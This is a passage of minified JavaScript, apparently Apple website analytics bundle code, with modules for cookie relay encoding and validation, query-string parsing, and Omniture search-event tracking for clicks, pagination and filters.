0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}Object.defineProperty(exports,"__esModule",{value:!0}),exports.setDefaults=exports.registerCookieDomain=exports.getCookieDomain=void 0;var cookieDomain=null;exports.registerCookieDomain=function registerCookieDomain(value){cookieDomain=value},exports.getCookieDomain=function getCookieDomain(){return cookieDomain},exports.setDefaults=function setDefaults(){var options=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return _objectSpread(_objectSpread({},{type:"next"}),options)}},{}],132:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.triggerNewPage=void 0;var _dataStore=require("./dataStore.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}exports.triggerNewPage=function triggerNewPage(){["next","exit"].forEach((function(type){var data=(0,_dataStore.retrieve)({type:type});null!==data&&(Object.keys(data).forEach((function(key){var value=data[key];"beacon"===key&&"object"===_typeof(value)&&Object.keys(value).forEach((function(k){var v=value[k];"string"==typeof v&&(value[k]=v.replace(/pageName/g,"c14"))})),(0,_dataStore.store)({type:"page",key:key,data:value})})),(0,_dataStore.clear)({type:type}))})),(0,_dataStore.syncToCookie)()}},{"./dataStore.js":124}],133:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.encode=exports.decode=void 0;var _validation=require("./validation.js");function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}var encodePair=function encodePair(key,data){return"".concat(key,":").concat(encodeURIComponent(data[key]))};exports.encode=function encode(data){var safeData=(0,_validation.sanitizeCookie)(data);return Object.keys(safeData).reduce((function(out,key){return""===out?encodePair(key,safeData):function encodeJoin(a,b){return"".concat(a,"|").concat(b)}(out,encodePair(key,safeData))}),"")},exports.decode=function decode(data){return"string"!=typeof data?{}:data.split("|").reduce((function(decoded,current){var _current$split2=_slicedToArray(current.split(":"),2),key=_current$split2[0],value=_current$split2[1],decodedValue=decodeURIComponent(value),keyNotValid=!(0,_validation.validKey)(key),valueNotValid=!((0,_validation.validContent)(decodedValue)||(0,_validation.isException)(decodedValue));return keyNotValid||valueNotValid||(decoded[key]=decodedValue),decoded}),{})}},{"./validation.js":138}],134:[function(require,module,exports){"use strict";function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}Object.defineProperty(exports,"__esModule",{value:!0}),exports.getSearchParams=void 0;exports.getSearchParams=function getSearchParams(queryString){return URLSearchParams?new URLSearchParams(queryString):function parseSearchParams(queryString){var state=queryString.split("&").reduce((function(result,current){if(""===current)return result;var _current$split2=_slicedToArray(current.split("="),2),key=_current$split2[0],value=_current$split2[1];return result[key]=value,result}),{});return{set:function set(key,value){state[key]=value},get:function get(key){return state[key]},toString:function toString(){return Object.keys(state).reduce((function(result,key){return""===result?"".concat(key,"=").concat(state[key]):"".concat(result,"&").concat(key,"=").concat(state[key])}),"")}}}(queryString)}},{}],135:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"getBeacon",{enumerable:!0,get:function get(){return _relayRead.getBeacon}}),Object.defineProperty(exports,"getOne",{enumerable:!0,get:function get(){return _relayRead.getOne}}),Object.defineProperty(exports,"relayRead",{enumerable:!0,get:function get(){return _relayRead.relayRead}}),Object.defineProperty(exports,"relayWrite",{enumerable:!0,get:function get(){return _relayWrite.relayWrite}});var _relayWrite=require("./relayWrite.js"),_relayRead=require("./relayRead.js")},{"./relayRead.js":136,"./relayWrite.js":137}],136:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.relayRead=exports.getOne=exports.getBeacon=void 0;var _validation=require("./validation.js"),_encoder=require("./encoder.js"),_getSearchParams=require("./getSearchParams.js"),appendEvent=function appendEvent(current,key){return current?"".concat(current,",event").concat(key):"event".concat(key)},appendEVar17=function appendEVar17(current,next){return current?"".concat(current,"|").concat(next):next};exports.relayRead=function relayRead(){var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref$queryString=_ref.queryString,queryString=void 0===_ref$queryString?"":_ref$queryString,relay=_ref.relay,cookieData=_ref.cookieData;if(!cookieData||!relay)return{queryString:queryString};var cookie=(0,_encoder.decode)(cookieData),params=(0,_getSearchParams.getSearchParams)(queryString),beacon={};return Object.keys(relay).forEach((function(key){cookie[key]&&(0,_validation.validKey)(key)&&(params.set(relay[key],cookie[key]),beacon.events=appendEvent(beacon.events,key),beacon.eVar17=appendEVar17(beacon.eVar17,cookie[key]))})),{queryString:params.toString(),beacon:beacon}},exports.getOne=function getOne(_ref2){var key=_ref2.key,cookieData=_ref2.cookieData;return(0,_encoder.decode)(cookieData)[key]||null},exports.getBeacon=function getBeacon(_ref3){var keys=_ref3.keys,cookieData=_ref3.cookieData,defaultCampaigns=_ref3.defaultCampaigns,cookie=(0,_encoder.decode)(cookieData),beacon={};return Array.isArray(keys)&&keys.forEach((function(key){(0,_validation.validKey)(key)&&(cookie[key]?(beacon.events=appendEvent(beacon.events,key),beacon.eVar17=appendEVar17(beacon.eVar17,cookie[key])):defaultCampaigns&&defaultCampaigns[key]&&(beacon.events=appendEvent(beacon.events,key),beacon.eVar17=appendEVar17(beacon.eVar17,defaultCampaigns[key])))})),beacon}},{"./encoder.js":133,"./getSearchParams.js":134,"./validation.js":138}],137:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.relayWrite=void 0;var _validation=require("./validation.js"),_encoder=require("./encoder.js"),_getSearchParams=require("./getSearchParams.js");exports.relayWrite=function relayWrite(){var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},_ref$queryString=_ref.queryString,queryString=void 0===_ref$queryString?"":_ref$queryString,_ref$cookieData=_ref.cookieData,cookieData=void 0===_ref$cookieData?"":_ref$cookieData,data=(0,_encoder.decode)(cookieData),rid=(0,_getSearchParams.getSearchParams)(queryString).get("rid");return rid&&(data[rid.slice(0,_validation.PREFIX_SIZE)]=encodeURIComponent(rid.slice(_validation.PREFIX_SIZE+1))),(0,_encoder.encode)(data)}},{"./encoder.js":133,"./getSearchParams.js":134,"./validation.js":138}],138:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.validKey=exports.validContent=exports.sanitizeCookie=exports.isException=exports.PREFIX_SIZE=void 0;exports.PREFIX_SIZE=3;var validKey=exports.validKey=function validKey(key){return/^\d{3}$/.test(key)},validContent=exports.validContent=function validContent(value){return/^[0-9A-Za-z-_]+$/.test(value)},isException=exports.isException=function isException(value){return/^cid%3D[0-9A-Za-z-_]+$/.test(value)},isInvalid=function isInvalid(key,data,index){return!validKey(key)||"string"!=typeof data[key]||function isNotValidContentOrException(value){return!validContent(value)&&!isException(value)}(data[key])||index>=5};exports.sanitizeCookie=function sanitizeCookie(data){return Object.keys(data).forEach((function(key,index){isInvalid(key,data,index)?delete data[key]:!function isExceptionAndExceedsLength(value){return isException(value)&&value.length>100}(data[key])?function isTooLong(value){return value.length>50}(data[key])&&(data[key]=data[key].slice(0,50)):data[key]=data[key].slice(0,100)})),data}},{}],139:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.accessoriesFilter=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_constants=require("./constants.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.accessoriesFilter=function accessoriesFilter(){var _ref2,_ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},keyword=_ref.keyword,action=_ref.action,text=_ref.text,analyticsPrefix=_ref.analyticsPrefix;return _defineProperty(_ref2={},_analyticsOmnitureConstants.VARS.EVAR_2,(0,_analyticsUtils.toStrTrim)(keyword).toLowerCase()),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.EVAR_4,"".concat((0,_analyticsUtils.toStrTrim)(analyticsPrefix),":search:accessories")),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.PROP_3,"filter - ".concat((0,_analyticsUtils.toStrTrim)(action)," - ").concat((0,_analyticsUtils.toStrTrim)(text))),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.PROP_7,(0,_analyticsUtils.toStrTrim)(keyword).toLowerCase()),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.EVENTS,new _analyticsOmnitureCollection.OmnitureCollection(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.ACCESSORIES_FILTER))),_ref2}},{"./constants.js":141,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],140:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.begin=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_constants=require("./constants.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.begin=function begin(){var _ref2,_ref$action=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).action,action=void 0===_ref$action?"":_ref$action;return _defineProperty(_ref2={},_analyticsOmnitureConstants.VARS.PROP_3,"".concat((0,_analyticsUtils.toStrTrim)(action)||"engage"," - search field")),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.EVENTS,new _analyticsOmnitureCollection.OmnitureCollection(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.BEGIN))),_ref2}},{"./constants.js":141,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],141:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.EVENTS=exports.APPLE_SERVICES=void 0;var _analyticsOmnitureConstants=require("@apple/analytics-omniture-constants");exports.EVENTS={COMPLETE:_analyticsOmnitureConstants.EVENTS.EVENT_7,SEARCH:_analyticsOmnitureConstants.EVENTS.EVENT_8,EXIT:_analyticsOmnitureConstants.EVENTS.EVENT_364,BEGIN:_analyticsOmnitureConstants.EVENTS.EVENT_366,QUICK_LINK:_analyticsOmnitureConstants.EVENTS.EVENT_38,SUGGESTED:_analyticsOmnitureConstants.EVENTS.EVENT_39,NO_RESULTS:_analyticsOmnitureConstants.EVENTS.EVENT_49,NO_RESULTS_CLICK:_analyticsOmnitureConstants.EVENTS.EVENT_67,DEFAULT_LINK:_analyticsOmnitureConstants.EVENTS.EVENT_50,ACCESSORIES_LINK:_analyticsOmnitureConstants.EVENTS.EVENT_52,STORE_LINK:_analyticsOmnitureConstants.EVENTS.EVENT_288,ACCESSORIES_FILTER:_analyticsOmnitureConstants.EVENTS.EVENT_369,CURATED:_analyticsOmnitureConstants.EVENTS.EVENT_370,PAGINATION:_analyticsOmnitureConstants.EVENTS.EVENT_371,SERP_DIRECT:_analyticsOmnitureConstants.EVENTS.EVENT_372},exports.APPLE_SERVICES=[{protocol:"applenewss:",token:"nws-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_285},{protocol:"itms-apps:",token:"arc-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_288},{origin:"https://news.apple.com",token:"nws-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_285},{origin:"https://music.apple.com",token:"mus-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_286},{origin:"https://wallet.apple.com",token:"ccd-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_287},{origin:"https://apps.apple.com",token:"app_store-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_288},{origin:"https://tv.apple.com",token:"atv-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_289},{origin:"https://books.apple.com",token:"books-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_294},{origin:"https://fitness.apple.com",token:"fitness-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_299},{origin:"https://podcasts.apple.com",token:"podcasts-0-int_srch-apl",event:_analyticsOmnitureConstants.EVENTS.EVENT_300}]},{"@apple/analytics-omniture-constants":115}],142:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.exit=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_constants=require("./constants.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.exit=function exit(){var _ref2,keyword=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).keyword;return _defineProperty(_ref2={},_analyticsOmnitureConstants.VARS.PROP_7,(0,_analyticsUtils.toStrTrim)(keyword).toLowerCase()),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.PROP_29,null),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.EVAR_2,"D=c7"),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.EVENTS,new _analyticsOmnitureCollection.OmnitureCollection(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.EXIT))),_ref2}},{"./constants.js":141,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],143:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getRelayForLink=void 0;var _constants=require("./constants.js");exports.getRelayForLink=function getRelayForLink(URLObject){return _constants.APPLE_SERVICES.find((function(urlDetails){return urlDetails.origin?urlDetails.origin===URLObject.origin:urlDetails.protocol===URLObject.protocol}))}},{"./constants.js":141}],144:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"accessoriesFilter",{enumerable:!0,get:function get(){return _accessoriesFilter.accessoriesFilter}}),Object.defineProperty(exports,"begin",{enumerable:!0,get:function get(){return _begin.begin}}),Object.defineProperty(exports,"exit",{enumerable:!0,get:function get(){return _exit.exit}}),Object.defineProperty(exports,"pagination",{enumerable:!0,get:function get(){return _pagination.pagination}}),Object.defineProperty(exports,"perform",{enumerable:!0,get:function get(){return _perform.perform}}),Object.defineProperty(exports,"resultClick",{enumerable:!0,get:function get(){return _resultClick.resultClick}}),Object.defineProperty(exports,"serpPageLoad",{enumerable:!0,get:function get(){return _serpPageLoad.serpPageLoad}});var _begin=require("./begin.js"),_perform=require("./perform.js"),_serpPageLoad=require("./serpPageLoad.js"),_pagination=require("./pagination.js"),_resultClick=require("./resultClick.js"),_exit=require("./exit.js"),_accessoriesFilter=require("./accessoriesFilter.js")},{"./accessoriesFilter.js":139,"./begin.js":140,"./exit.js":142,"./pagination.js":145,"./perform.js":146,"./resultClick.js":147,"./serpPageLoad.js":148}],145:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.pagination=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_constants=require("./constants.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.pagination=function pagination(){var _ref2,_ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},currentPage=_ref.currentPage,nextPage=_ref.nextPage,_ref$action=_ref.action,action=void 0===_ref$action?"click":_ref$action;return _defineProperty(_ref2={},_analyticsOmnitureConstants.VARS.PROP_2,"".concat((0,_analyticsUtils.toStrTrim)(action)," - page ").concat((0,_analyticsUtils.toStrTrim)(currentPage))),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.PROP_3,"".concat((0,_analyticsUtils.toStrTrim)(action)," - page ").concat((0,_analyticsUtils.toStrTrim)(nextPage))),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.EVAR_15,"search (search)"),_defineProperty(_ref2,_analyticsOmnitureConstants.VARS.EVENTS,new _analyticsOmnitureCollection.OmnitureCollection(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.SEARCH),new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.PAGINATION))),_ref2}},{"./constants.js":141,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],146:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.perform=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_typeToEvents=require("./typeToEvents.js"),_constants=require("./constants.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var SEARCH_TYPES=["quicklinks","suggestions","defaultlinks"];exports.perform=function perform(){var _objectSpread2,_ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},keyword=_ref.keyword,method=_ref.method,position=_ref.position,results=_ref.results,source=_ref.source,suggestedValue=_ref.suggestedValue,type=_ref.type,keywordLowerCase=(0,_analyticsUtils.toStrTrim)(keyword).toLowerCase(),keywordForEvar23="no keyword"===keywordLowerCase?"":keywordLowerCase,suggestedValueLowerCase=(0,_analyticsUtils.toStrTrim)(suggestedValue).toLowerCase(),events=(0,_typeToEvents.typeToEvents)(type),searchMethod="suggestions"===type?"suggested":method;return _objectSpread(_objectSpread({},void 0!==position?_defineProperty({},_analyticsOmnitureConstants.VARS.EVAR_23,[keywordForEvar23,suggestedValueLowerCase,searchMethod,results,position].map(_analyticsUtils.toStrTrim).join("|")):{}),{},(_defineProperty(_objectSpread2={},_analyticsOmnitureConstants.VARS.PROP_7,SEARCH_TYPES.includes(type)?suggestedValueLowerCase:keywordLowerCase||"___blank___"),_defineProperty(_objectSpread2,_analyticsOmnitureConstants.VARS.EVAR_2,"D=c7"),_defineProperty(_objectSpread2,_analyticsOmnitureConstants.VARS.EVAR_15,"".concat((0,_analyticsUtils.toStrTrim)(source)," (").concat("suggestions"===type?"typed":(0,_analyticsUtils.toStrTrim)(method),")")),_defineProperty(_objectSpread2,_analyticsOmnitureConstants.VARS.EVENTS,events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.SEARCH))),_objectSpread2))}},{"./constants.js":141,"./typeToEvents.js":149,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],147:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.resultClick=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsRelay=require("@apple/analytics-relay"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_constants=require("./constants.js"),_getRelayForLink=require("./getRelayForLink.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var join=function join(arr){return arr.map(_analyticsUtils.toStrTrim).join("|")};exports.resultClick=function resultClick(){var _beacon,_ref3=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},accessoriesLink=_ref3.accessoriesLink,storeLink=_ref3.storeLink,serviceLink=_ref3.serviceLink,bannerLink=_ref3.bannerLink,keyword=_ref3.keyword,intent=_ref3.intent,position=_ref3.position,relayId=_ref3.relayId,region=_ref3.region,URLObject=_ref3.URLObject,results=_ref3.results,currentPage=_ref3.currentPage,keywordLowerCase=(0,_analyticsUtils.toStrTrim)(keyword).toLowerCase(),isNullSearch=0===results,isComplete=serviceLink||!isNullSearch,relay=function relayEvent(_ref2){var eVar17,URLObject=_ref2.URLObject,serviceLink=_ref2.serviceLink,relayId=_ref2.relayId,events=new _analyticsOmnitureCollection.OmnitureCollection;if(URLObject){var relayDetails=(0,_getRelayForLink.getRelayForLink)(URLObject);relayDetails&&(eVar17=(0,_analyticsRelay.getOne)(relayDetails.token)||"aos_search_result",events.add(new _analyticsOmnitureCollection.OmnitureEvent(relayDetails.event)))}return eVar17||(eVar17=serviceLink?relayId||"aos_search_result":""),{eVar17:eVar17,events:events}}({URLObject:URLObject,serviceLink:serviceLink,relayId:relayId}),events=function makeEvents(_ref){var accessoriesLink=_ref.accessoriesLink,storeLink=_ref.storeLink,relay=_ref.relay,results=_ref.results,isComplete=_ref.isComplete,events=new _analyticsOmnitureCollection.OmnitureCollection(new _analyticsOmnitureCollection.OmnitureEvent(isComplete?_constants.EVENTS.COMPLETE:_constants.EVENTS.SEARCH));return 0===results&&events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.NO_RESULTS_CLICK)),accessoriesLink&&events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.ACCESSORIES_LINK)),storeLink&&events.add(new _analyticsOmnitureCollection.OmnitureEvent(_constants.EVENTS.STORE_LINK)),relay&&events.merge(relay.events),events}({accessoriesLink:accessoriesLink,storeLink:storeLink,relay:relay,results:results,isComplete:isComplete}),beacon=(_defineProperty(_beacon={},_analyticsOmnitureConstants.VARS.PROP_7,keywordLowerCase),_defineProperty(_beacon,_analyticsOmnitureConstants.VARS.EVAR_2,"D=c7"),_defineProperty(_beacon,_analyticsOmnitureConstants.VARS.EVENTS,events),_beacon);return relay.eVar17&&(beacon[_analyticsOmnitureConstants.VARS.EVAR_17]=relay.eVar17),!bannerLink&&isComplete&&(beacon[_analyticsOmnitureConstants.VARS.PROP_29]=join([keywordLowerCase,intent,results,currentPage,position])),isNullSearch&&(beacon[_analyticsOmnitureConstants.VARS.PROP_30]=join([keywordLowerCase,intent,results,region,position])),isNullSearch&&!serviceLink&&(beacon[_analyticsOmnitureConstants.VARS.EVAR_15]="null (clicked)"),beacon}},{"./constants.js":141,"./getRelayForLink.js":143,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115,"@apple/analytics-relay":135,"@apple/analytics-utils":190}],148:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.serpPageLoad=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_constants=require("./constants.js");function _typeof(o){return 